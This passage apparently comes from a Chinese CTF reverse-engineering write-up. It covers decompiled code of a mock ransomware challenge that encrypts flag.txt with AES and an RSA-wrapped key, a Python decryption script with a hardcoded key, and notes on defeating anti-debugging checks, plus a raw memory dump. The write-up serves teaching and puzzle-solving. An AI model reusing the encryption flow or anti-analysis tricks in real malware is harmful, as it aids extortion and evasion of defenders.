<span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">bool</span> v12; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v13; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v15; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  BigInteger *v17; <span class="comment">// eax</span></span><br><span class="line">  BigInteger *v18; <span class="comment">// eax</span></span><br><span class="line">  BigInteger *v19; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// edx</span></span><br><span class="line">  BigInteger *v21; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> *v26; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> FILE_write; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> len_1; <span class="comment">// [esp+Ch] [ebp-29Ch]</span></span><br><span class="line">  FILE *FILE_read_2; <span class="comment">// [esp+10h] [ebp-298h]</span></span><br><span class="line">  <span class="keyword">char</span> *buf_read_2; <span class="comment">// [esp+14h] [ebp-294h]</span></span><br><span class="line">  <span class="keyword">char</span> v37; <span class="comment">// [esp+18h] [ebp-290h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *arg2; <span class="comment">// [esp+1Ch] [ebp-28Ch]</span></span><br><span class="line">  <span class="keyword">char</span> key_1[<span class="number">256</span>]; <span class="comment">// [esp+20h] [ebp-288h]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [esp+120h] [ebp-188h]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [esp+124h] [ebp-184h]</span></span><br><span class="line">  <span class="keyword">int</span> v42[<span class="number">7</span>]; <span class="comment">// [esp+128h] [ebp-180h]</span></span><br><span class="line">  BigInteger v43; <span class="comment">// [esp+144h] [ebp-164h]</span></span><br><span class="line">  BigInteger v44; <span class="comment">// [esp+160h] [ebp-148h]</span></span><br><span class="line">  BigInteger v45; <span class="comment">// [esp+17Ch] [ebp-12Ch]</span></span><br><span class="line">  <span class="keyword">char</span> toWriteFileName[<span class="number">256</span>]; <span class="comment">// [esp+198h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v47; <span class="comment">// [esp+2A4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  arg2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)a2;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  FILE_read = (FILE *)fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  FILE_read_1 = FILE_read;</span><br><span class="line">  FILE_read_2 = FILE_read;</span><br><span class="line">  <span class="keyword">if</span> ( !FILE_read )</span><br><span class="line">  &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;flag.txt not exist\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fseek((<span class="keyword">int</span>)FILE_read, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  len_0 = ftell((<span class="keyword">int</span>)FILE_read_1);</span><br><span class="line">  len_1 = len_0;</span><br><span class="line">  fseek((<span class="keyword">int</span>)FILE_read_1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  len = <span class="number">16</span> * (len_0 / <span class="number">16</span> + <span class="number">1</span>);</span><br><span class="line">  buf_read = (<span class="keyword">char</span> *)malloc_0(len);</span><br><span class="line">  buf_read_2 = buf_read;</span><br><span class="line">  <span class="built_in">memset</span>(buf_read, <span class="number">0</span>, len);</span><br><span class="line">  <span class="keyword">if</span> ( buf_read )</span><br><span class="line">  &#123;</span><br><span class="line">	fread(buf_read, <span class="number">1</span>, len_1, FILE_read_2);</span><br><span class="line">	keyLen = <span class="built_in">strlen</span>(aWannareverse);</span><br><span class="line">	buf_read_1 = buf_read;</span><br><span class="line">	key = aWannareverse;</span><br><span class="line">	v12 = keyLen &lt; <span class="number">4</span>;</span><br><span class="line">	v11 = keyLen - <span class="number">4</span>;</span><br><span class="line">	<span class="keyword">if</span> ( v12 )</span><br><span class="line">	&#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">	  <span class="keyword">if</span> ( v11 == <span class="number">-4</span> )</span><br><span class="line">		<span class="keyword">goto</span> LABEL_16;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">while</span> ( *(_DWORD *)buf_read_1 == *(_DWORD *)key )</span><br><span class="line">	  &#123;</span><br><span class="line">		buf_read_1 += <span class="number">4</span>;</span><br><span class="line">		key += <span class="number">4</span>;</span><br><span class="line">		v12 = v11 &lt; <span class="number">4</span>;</span><br><span class="line">		v11 -= <span class="number">4</span>;</span><br><span class="line">		<span class="keyword">if</span> ( v12 )</span><br><span class="line">		  <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	v12 = (<span class="keyword">unsigned</span> __int8)*buf_read_1 &lt; (<span class="keyword">unsigned</span> __int8)*key;</span><br><span class="line">	<span class="keyword">if</span> ( *buf_read_1 != *key</span><br><span class="line">	  || v11 != <span class="number">-3</span></span><br><span class="line">	  &amp;&amp; ((v13 = buf_read_1[<span class="number">1</span>], v12 = v13 &lt; (<span class="keyword">unsigned</span> __int8)key[<span class="number">1</span>], v13 != key[<span class="number">1</span>])</span><br><span class="line">	   || v11 != <span class="number">-2</span></span><br><span class="line">	   &amp;&amp; ((v14 = buf_read_1[<span class="number">2</span>], v12 = v14 &lt; (<span class="keyword">unsigned</span> __int8)key[<span class="number">2</span>], v14 != key[<span class="number">2</span>])</span><br><span class="line">		|| v11 != <span class="number">-1</span> &amp;&amp; (v15 = buf_read_1[<span class="number">3</span>], v12 = v15 &lt; (<span class="keyword">unsigned</span> __int8)key[<span class="number">3</span>], v15 != key[<span class="number">3</span>]))) )</span><br><span class="line">	&#123;</span><br><span class="line">	  v16 = -v12 | <span class="number">1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">	&#125;</span><br><span class="line">LABEL_16:</span><br><span class="line">	v16 = <span class="number">0</span>;</span><br><span class="line">LABEL_17:</span><br><span class="line">	<span class="keyword">if</span> ( v16 )</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memset</span>(key_1, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">	  v41 = <span class="number">16</span>;</span><br><span class="line">	  v40 = <span class="number">0</span>;</span><br><span class="line">	  getKey((<span class="keyword">int</span> *)key_1);                     <span class="comment">// initKey</span></span><br><span class="line">	  v47 = <span class="number">0</span>;</span><br><span class="line">	  v44.next = <span class="number">0</span>;</span><br><span class="line">	  v44.len = <span class="number">0</span>;</span><br><span class="line">	  v44.maxLen = <span class="number">0</span>;</span><br><span class="line">	  v17 = (BigInteger *)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	  v44.next = v17;</span><br><span class="line">	  v17-&gt;next = <span class="number">0</span>;</span><br><span class="line">	  *(_DWORD *)v17-&gt;data = <span class="number">0</span>;</span><br><span class="line">	  v44.next-&gt;next = &amp;v44;</span><br><span class="line">	  v44.len = <span class="number">0</span>;</span><br><span class="line">	  v44.maxLen = <span class="number">15</span>;</span><br><span class="line">	  v44.data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	  v47 = <span class="number">1</span>;</span><br><span class="line">	  append(&amp;v44, (<span class="keyword">int</span>)aWannareverse, <span class="number">13u</span>);    <span class="comment">// toDebug</span></span><br><span class="line">	  LOBYTE(v47) = <span class="number">2</span>;</span><br><span class="line">	  v45.next = <span class="number">0</span>;</span><br><span class="line">	  v45.len = <span class="number">0</span>;</span><br><span class="line">	  v45.maxLen = <span class="number">0</span>;</span><br><span class="line">	  v18 = (BigInteger *)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	  v45.next = v18;</span><br><span class="line">	  v18-&gt;next = <span class="number">0</span>;</span><br><span class="line">	  *(_DWORD *)v18-&gt;data = <span class="number">0</span>;</span><br><span class="line">	  v45.next-&gt;next = &amp;v45;</span><br><span class="line">	  v45.len = <span class="number">0</span>;</span><br><span class="line">	  v45.maxLen = <span class="number">15</span>;</span><br><span class="line">	  v45.data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	  LOBYTE(v47) = <span class="number">3</span>;</span><br><span class="line">	  initBigInteger(&amp;v43, arg2);</span><br><span class="line">	  LOBYTE(v47) = <span class="number">4</span>;</span><br><span class="line">	  v19 = (BigInteger *)rsaEncrypt((<span class="keyword">int</span>)v42, (<span class="keyword">int</span>)&amp;v43);</span><br><span class="line">	  <span class="keyword">if</span> ( &amp;v45 != v19 )</span><br><span class="line">	  &#123;</span><br><span class="line">		sub_403580((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">		LOBYTE(arg2) = <span class="number">0</span>;</span><br><span class="line">		base64((<span class="keyword">char</span> *)&amp;v45, v19, (<span class="keyword">int</span>)arg2);</span><br><span class="line">	  &#125;</span><br><span class="line">	  sub_403580(v42);</span><br><span class="line">	  sub_4037D0(v42);</span><br><span class="line">	  LOBYTE(v47) = <span class="number">3</span>;</span><br><span class="line">	  sub_403580((<span class="keyword">int</span> *)&amp;v43);</span><br><span class="line">	  sub_4037D0((<span class="keyword">int</span> *)&amp;v43);</span><br><span class="line">	  v20 = v45.data;</span><br><span class="line">	  <span class="keyword">if</span> ( v45.maxLen &gt;= <span class="number">0x10</span>u )</span><br><span class="line">		v20 = *(<span class="keyword">char</span> **)v45.data;</span><br><span class="line">	  v21 = (BigInteger *)sub_4024D0(v20, v42, v45.len);</span><br><span class="line">	  <span class="keyword">if</span> ( &amp;v45 != v21 )</span><br><span class="line">	  &#123;</span><br><span class="line">		sub_403580((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">		LOBYTE(arg2) = <span class="number">0</span>;</span><br><span class="line">		base64((<span class="keyword">char</span> *)&amp;v45, v21, (<span class="keyword">int</span>)arg2);</span><br><span class="line">	  &#125;</span><br><span class="line">	  LOBYTE(v47) = <span class="number">3</span>;</span><br><span class="line">	  sub_403580(v42);</span><br><span class="line">	  sub_4037D0(v42);</span><br><span class="line">	  v22 = v45.data;</span><br><span class="line">	  <span class="keyword">if</span> ( v45.maxLen &gt;= <span class="number">0x10</span>u )</span><br><span class="line">		v22 = *(<span class="keyword">char</span> **)v45.data;</span><br><span class="line">	  append(&amp;v44, (<span class="keyword">int</span>)v22, v45.len);</span><br><span class="line">	  v23 = <span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">for</span> ( *(_OWORD *)&amp;v43.data[<span class="number">8</span>] = <span class="number">0</span>i64; v23 &lt; len; v23 += <span class="number">16</span> )</span><br><span class="line">	  &#123;</span><br><span class="line">		aes((<span class="keyword">int</span>)&amp;v43.data[<span class="number">8</span>], (<span class="keyword">unsigned</span> __int8 *)&amp;buf_read_2[v23], (<span class="keyword">int</span>)key_1);</span><br><span class="line">		append(&amp;v44, (<span class="keyword">int</span>)&amp;v43.data[<span class="number">8</span>], <span class="number">0x10</span>u);</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="built_in">memset</span>(toWriteFileName, <span class="number">0</span>, <span class="number">256</span>);          <span class="comment">// make file name</span></span><br><span class="line">	  v24 = <span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">do</span></span><br><span class="line">	  &#123;</span><br><span class="line">		v25 = aFlagTxt[v24++];</span><br><span class="line">		*((_BYTE *)&amp;v45.maxLen + v24 + <span class="number">3</span>) = v25;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="keyword">while</span> ( v25 );</span><br><span class="line">	  v26 = (<span class="keyword">char</span> *)&amp;v45.maxLen + <span class="number">3</span>;</span><br><span class="line">	  <span class="keyword">do</span></span><br><span class="line">		v27 = (v26++)[<span class="number">1</span>];</span><br><span class="line">	  <span class="keyword">while</span> ( v27 );</span><br><span class="line">	  <span class="built_in">strcpy</span>(v26, <span class="string">&quot;.Encry&quot;</span>);</span><br><span class="line">	  v37 = <span class="number">0</span>;</span><br><span class="line">	  FILE_write = fopen(toWriteFileName, <span class="string">&quot;wb&quot;</span>);<span class="comment">// make file name</span></span><br><span class="line">	  v29 = FILE_write;</span><br><span class="line">	  <span class="keyword">if</span> ( FILE_write )</span><br><span class="line">	  &#123;</span><br><span class="line">		v30 = v44.len;</span><br><span class="line">		v31 = v44.data;</span><br><span class="line">		<span class="keyword">if</span> ( v44.maxLen &gt;= <span class="number">0x10</span>u )</span><br><span class="line">		  LOBYTE(v31) = v44.data[<span class="number">0</span>];</span><br><span class="line">		v32 = fwrite((<span class="keyword">char</span>)v31, <span class="number">1</span>, v44.len, FILE_write);</span><br><span class="line">		v33 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> ( v30 == v32 )</span><br><span class="line">		  v33 = <span class="number">1</span>;</span><br><span class="line">		v37 = v33;</span><br><span class="line">	  &#125;</span><br><span class="line">	  fclose(v29);</span><br><span class="line">	  sub_403580((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">	  sub_4037D0((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">	  sub_403580((<span class="keyword">int</span> *)&amp;v44);</span><br><span class="line">	  sub_4037D0((<span class="keyword">int</span> *)&amp;v44);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  sub_415950(buf_read_2);</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(FILE_read_2);</span><br><span class="line">  <span class="keyword">return</span> v37;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
    主要做了以下事情：
    1. 打开文件，判断文件头，如果是WannaReverse就不加密直接退出
    2. 打开一个buffer，然后放入WannaReverse
    3. 使用RSA加密上一步生成的密钥然后base64
    3. 把加密过的密钥放入buffer
    4. AES加密文件内容，然后放入buffer
    3. 生成文件名，写入文件
4. RSA私钥在clickme.exe中可以找到

解密脚本

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES,PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x5C</span>,<span class="number">0xBC</span>,<span class="number">0xEA</span>,<span class="number">0x89</span>,<span class="number">0xBA</span>,<span class="number">0x2B</span>,<span class="number">0x18</span>,<span class="number">0x27</span>,<span class="number">0x79</span>,<span class="number">0x3F</span>,<span class="number">0x13</span>,<span class="number">0x0A</span>,<span class="number">0x8A</span>,<span class="number">0x97</span>,<span class="number">0xB4</span>,<span class="number">0x9B</span>,<span class="number">0xCD</span>,<span class="number">0x78</span>,<span class="number">0x9B</span>,<span class="number">0xD8</span>,<span class="number">0x35</span>,<span class="number">0x92</span>,<span class="number">0x05</span>,<span class="number">0x45</span>,<span class="number">0x4C</span>,<span class="number">0x22</span>,<span class="number">0xA5</span>,<span class="number">0x69</span>,<span class="number">0x37</span>,<span class="number">0xEB</span>,<span class="number">0x6E</span>,<span class="number">0x2B</span>,<span class="number">0x0E</span>,<span class="number">0xBD</span>,<span class="number">0x84</span>,<span class="number">0x0F</span>,<span class="number">0x91</span>,<span class="number">0x61</span>,<span class="number">0x38</span>,<span class="number">0xF6</span>,<span class="number">0xF1</span>,<span class="number">0xBA</span>,<span class="number">0x99</span>,<span class="number">0x19</span>,<span class="number">0x41</span>,<span class="number">0x72</span>,<span class="number">0x07</span>,<span class="number">0x91</span>,<span class="number">0xF0</span>,<span class="number">0x26</span>,<span class="number">0x68</span>,<span class="number">0x06</span>,<span class="number">0x61</span>,<span class="number">0x26</span>,<span class="number">0x5C</span>,<span class="number">0x20</span>,<span class="number">0x35</span>,<span class="number">0xDD</span>,<span class="number">0xCF</span>,<span class="number">0xFC</span>,<span class="number">0x77</span>,<span class="number">0x57</span>,<span class="number">0x54</span>,<span class="number">0x81</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0xE4</span>,<span class="number">0xAF</span>,<span class="number">0xBF</span>,<span class="number">0xA2</span>,<span class="number">0x1D</span>,<span class="number">0x29</span>,<span class="number">0xAE</span>,<span class="number">0x6C</span>,<span class="number">0x08</span>,<span class="number">0x3B</span>,<span class="number">0x76</span>,<span class="number">0x1B</span>,<span class="number">0x66</span>,<span class="number">0xB8</span>,<span class="number">0xFE</span>,<span class="number">0x72</span>,<span class="number">0xCB</span>,<span class="number">0xD6</span>,<span class="number">0x94</span>,<span class="number">0xC3</span>,<span class="number">0xD5</span>,<span class="number">0x6A</span>,<span class="number">0xE7</span>,<span class="number">0x0C</span>,<span class="number">0x7A</span>,<span class="number">0x28</span>,<span class="number">0xDC</span>,<span class="number">0xBC</span>,<span class="number">0xAC</span>,<span class="number">0x80</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;30776159143604297789676442413079&#x27;</span></span><br><span class="line">aes = AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">r = aes.decrypt(bytes(a))</span><br><span class="line">print(str(r,encoding=<span class="string">&#x27;utf-16&#x27;</span>))</span><br></pre></td></tr></table></figure>


## [rev]

找到了这篇文章https://www.gironsec.com/blog/2013/12/other-antidebug-tricks/
https://www.sohu.com/a/249321179_354899
CsrGetProcessId is a native API that returns the PID of csrss.exe
这个函数返回csrss.exe的PID

大概是一种反调试技术,程序尝试获取csrss.exe的pid，然后openProcess。由于大多数调制器需要管理越权限，所以如果当前进程成功打开csrss.exe，就可以判断为被调试。

CheckRemoteDebuggerPresent

NtQueryInformationProcess第三个参数，如果有调制器，就会返回-1

好家伙一整个反调试函数，我直接给你nop掉

\_\_rdtsc返回时间辍

经过调试发现程序把自己载入内存，然后查找getflag函数，似乎作了一些变换，但是不去管，我tm直接将对应的区段保存为文件，然后是个可执行文件，IDA打开

1. v3的信息：

    - 0是个技术器
    - 14是v7，v7+8是输入长度，v7+20为off input-off v4
    - 1是800
    - 12是和800有关的数
    - 13是off v4

2. 看答案了，确实是虚拟机，可以在输入下硬件断点，发现是一组异或

3. 对于输入下硬件断点，并且输入经过处理后存入的目标内存也下硬件断点，就可以调试出程序的主逻辑

后续分析
1. 以上分析到了vm，进入到vm，首先是个大循环，下面有个函数调用，参数是10006890，调试获得这个地方真实的数据
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">10096890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</span><br><span class="line">100968A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</span><br><span class="line">100968B0 01 00 00 00 00 00 00 00 80 97 00 10 00 00 00 00 ................</span><br><span class="line">100968C0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100968D0 02 00 00 00 00 00 00 00 C0 97 00 10 00 00 00 00 ........À.......</span><br><span class="line">100968E0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100968F0 03 00 00 00 00 00 00 00 A0 95 00 10 00 00 00 00 ........ .......</span><br><span class="line">10096900 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096910 04 00 00 00 00 00 00 00 F0 95 00 10 00 00 00 00 ........ð.......</span><br><span class="line">10096920 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096930 05 00 00 00 00 00 00 00 30 97 00 10 00 00 00 00 ........0.......</span><br><span class="line">10096940 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096950 06 00 00 00 20 00 9D 00 E0 96 00 10 00 00 00 00 .... ...à.......</span><br><span class="line">10096960 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096970 07 00 00 00 FF FF FF FF 40 96 00 10 00 00 00 00 ....ÿÿÿÿ@.......</span><br><span class="line">10096980 00 00 00 00 00 00 00 00 02 00 00 00 01 00 00 00 ................</span><br><span class="line">10096990 08 00 00 00 00 00 00 00 90 96 00 10 00 00 00 00 ................</span><br><span class="line">100969A0 00 00 00 00 00 00 00 00 02 00 00 00 AC 06 02 77 ............¬..w</span><br><span class="line">100969B0 09 00 00 00 00 00 00 00 80 75 00 10 00 00 00 00 .........u......</span><br><span class="line">100969C0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100969D0 0A 00 00 00 00 00 00 00 D0 75 00 10 00 00 00 00 ........Ðu......</span><br><span class="line">100969E0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100969F0 0B 00 00 00 70 F7 36 00 20 A0 00 10 00 00 00 00 ....p÷6.  ......</span><br><span class="line">10096A00 00 00 00 00 00 00 00 00 02 00 00 00 34 B2 00 10 ............4²..</span><br><span class="line">10096A10 0C 00 00 00 A0 07 00 00 70 A0 00 10 00 00 00 00 .... ...p ......</span><br><span class="line">10096A20 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096A30 0D 00 00 00 00 00 00 00 30 98 00 10 00 00 00 00 ........0.......</span><br><span class="line">10096A40 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096A50 0E 00 00 00 00 E0 FD 7E 80 98 00 10 00 00 00 00 .....àý~........</span><br><span class="line">10096A60 00 00 00 00 00 00 00 00 02 00 00 00 18 00 00 00 ................</span><br><span class="line">10096A70 0F 00 00 00 66 34 03 77 10 80 00 10 00 00 00 00 ....f4.w........</span><br><span class="line">10096A80 00 00 00 00 00 00 00 00 02 00 00 00 48 B5 79 00 ............Hµy.</span><br><span class="line">10096A90 10 00 00 00 00 00 79 00 70 80 00 10 00 00 00 00 ......y.p.......</span><br><span class="line">10096AA0 00 00 00 00 00 00 00 00 02 00 00 00 0C 2A 08 01 .............*..</span><br><span class="line">10096AB0 11 00 00 00 FF FF FF FF 40 99 00 10 00 00 00 00 ....ÿÿÿÿ@.......</span><br><span class="line">10096AC0 00 00 00 00 00 00 00 00 02 00 00 00 4C 17 00 00 ............L...</span><br><span class="line">10096AD0 12 00 00 00 99 5A 00 00 90 99 00 10 00 00 00 00 .....Z..........</span><br><span class="line">10096AE0 00 00 00 00 00 00 00 00 02 00 00 00 33 00 00 00 ............3...</span><br><span class="line">10096AF0 13 00 00 00 00 00 00 00 20 AB 00 10 00 00 00 00 ........ «......</span><br><span class="line">10096B00 00 00 00 00 00 00 00 00 02 00 00 00 C0 00 00 00 ............À...</span><br><span class="line">10096B10 14 00 00 00 B9 AC 08 77 70 AB 00 10 00 00 00 00 ....¹¬.wp«......</span><br><span class="line">10096B20 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096B30 15 00 00 00 02 1E 7A 00 70 76 00 10 00 00 00 00 ......z.pv......</span><br><span class="line">10096B40 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096B50 16 00 00 00 A0 07 00 00 C0 76 00 10 00 00 00 00 .... ...Àv......</span><br><span class="line">10096B60 00 00 00 00 00 00 00 00 02 00 00 00 D7 EE 02 77 ............×î.w</span><br><span class="line">10096B70 17 00 00 00 00 00 79 01 00 99 00 10 00 00 00 00 ......y.........</span><br><span class="line">10096B80 00 00 00 00 00 00 00 00 01 00 00 00 FE FF FF FF ............þÿÿÿ</span><br><span class="line">10096B90 18 00 00 00 06 14 0D 77 E0 9D 00 10 00 00 00 00 .......wà.......</span><br><span class="line">10096BA0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096BB0 19 00 00 00 04 00 00 00 30 9E 00 10 00 00 00 00 ........0.......</span><br><span class="line">10096BC0 00 00 00 00 00 00 00 00 02 00 00 00 22 14 0D 77 ............&quot;..w</span><br><span class="line">10096BD0 1A 00 00 00 00 00 00 00 90 9E 00 10 00 00 00 00 ................</span><br><span class="line">10096BE0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096BF0 1B 00 00 00 20 00 00 00 E0 9E 00 10 00 00 00 00 .... ...à.......</span><br><span class="line">10096C00 00 00 00 00 00 00 00 00 02 00 00 00 3D 30 03 77 ............&#x3D;0.w</span><br><span class="line">10096C10 1C 00 00 00 A4 F5 36 00 C0 7E 00 10 00 00 00 00 ....¤õ6.À~......</span><br><span class="line">10096C20 00 00 00 00 00 00 00 00 02 00 00 00 B0 1D 7A 00 ............°.z.</span><br><span class="line">10096C30 1D 00 00 00 CD 4D 07 77 80 9A 00 10 00 00 00 00 ....ÍM.w........</span><br><span class="line">10096C40 00 00 00 00 00 00 00 00 01 00 00 00 00 10 50 00 ..............P.</span><br><span class="line">10096C50 1E 00 00 00 03 00 0A 00 C0 9A 00 10 00 00 00 00 ........À.......</span><br><span class="line">10096C60 00 00 00 00 00 00 00 00 01 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096C70 1F 00 00 00 00 00 79 00 E0 99 00 10 00 00 00 00 ......y.à.......</span><br><span class="line">10096C80 00 00 00 00 00 00 00 00 01 00 00 00 E8 1F 7A 00 ............è.z.</span><br><span class="line">10096C90 20 00 00 00 A8 F4 36 00 F0 7A 00 10 00 00 00 00  ...¨ô6.ðz......</span><br><span class="line">10096CA0 00 00 00 00 00 00 00 00 01 00 00 00 2C 1B 0D 77 ............,..w</span><br><span class="line">10096CB0 21 00 00 00 2C 1B 0D 77 50 7B 00 10 00 00 00 00 !...,..wP&#123;......</span><br><span class="line">10096CC0 00 00 00 00 00 00 00 00 01 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096CD0 22 00 00 00 00 00 50 00 B0 7B 00 10 00 00 00 00 &quot;.....P.°&#123;......</span><br><span class="line">10096CE0 00 00 00 00 00 00 00 00 01 00 00 00 E0 1F 7A 00 